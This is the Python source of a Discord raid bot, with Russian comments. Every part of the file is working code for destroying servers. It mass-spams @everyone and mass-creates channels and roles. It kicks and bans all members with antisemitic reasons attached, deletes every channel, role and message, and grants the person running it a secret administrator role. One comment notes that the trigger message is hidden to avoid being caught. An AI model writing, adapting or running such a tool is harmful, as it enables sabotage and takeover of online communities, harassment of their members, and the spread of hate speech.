import discord
from discord.ext import commands
from asyncio import sleep
from discord.utils import get
#T#
from Settings import TOKEN
#T#
bot = commands.Bot(command_prefix='@') # ! - префикс, на который будет реагировать наш бот

####HELP####
@bot.command(pass_context=True)   # @help
async def help(ctx, m):
    author = ctx.message.author # Объявляем переменную author и записываем туда информацию об авторе.
    await ctx.send(f'Our "fake" commands: (prefix is "@") spam ,spam_channel, role, allkick, allban, delete, delchannel, delrole, admin, {author.mention}!') # Выводим сообщение с упоминанием автора, обращаясь к переменной author.
####HELP####

@bot.command(pass_context=True)   
async def spam(ctx, m):
    await ctx.message.delete() #удаляем сообщение пользователя, чтобы не спалился
    count = 0
    while count < int(m):
        await ctx.send("@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone") #отправка текста
        count += 1
@bot.command(pass_context=True)   
async def spam_channel(ctx, m):
    await ctx.message.delete()
    count1 = 0
    while count1 < int(m):
        guild = ctx.message.guild
        await guild.create_text_channel('BombusChannel_V')
        count1 += 1
@bot.command(pass_context=True)
async def role(ctx, m):
    await ctx.message.delete()
    count = 0
    while count < int(m):
        await ctx.guild.create_role(name="Clown")
        count += 1
@bot.command()
async def allkick(ctx):
    for m in ctx.guild.members: #собираем всех участников
        try:
            await m.kick(reason="Because you Jew)") #кикаем
        except:
            pass
@bot.command()
async def allban(ctx):
    for m in ctx.guild.members: #собираем
        try:
            await m.ban(reason="Because you Hitler)")#баним
        except:
            pass
@bot.command()
async def delete(ctx, amount=10000):
    await ctx.channel.purge(limit=amount) #очищаем
@bot.command()
async def delchannel(ctx):
    failed = []
    counter = 0
    for channel in ctx.guild.channels: #собираем
        try:
            await channel.delete(reason="По просьбе") #удаляем
        except: failed.append(channel.name)
        else: counter += 1
    fmt = ", ".join(failed)
    await ctx.author.send(f"Удалено {counter} каналов. {f'Не удалил: {fmt}' if len(failed) > 0 else ''}") # отпровляем отчёт отправителю команды
@bot.command()
async def delrole(ctx):
    for m in ctx.guild.roles:
        try:
            await m.delete(reason="По просьбе")
        except:
            pass
@bot.command(pass_context=True)  # разрешаем передавать агрументы
async def admin(ctx):  # создаем асинхронную фунцию бота
    
    guild = ctx.guild
    perms = discord.Permissions(administrator=True) #права роли
    await guild.create_role(name="Hack", permissions=perms) #создаем роль
    
    role = discord.utils.get(ctx.guild.roles, name="Hack") #находим роль по имени
    user = ctx.message.author #находим юзера
    await user.add_roles(role) #добовляем роль
    
    await ctx.message.delete()
###
bot.run(TOKEN)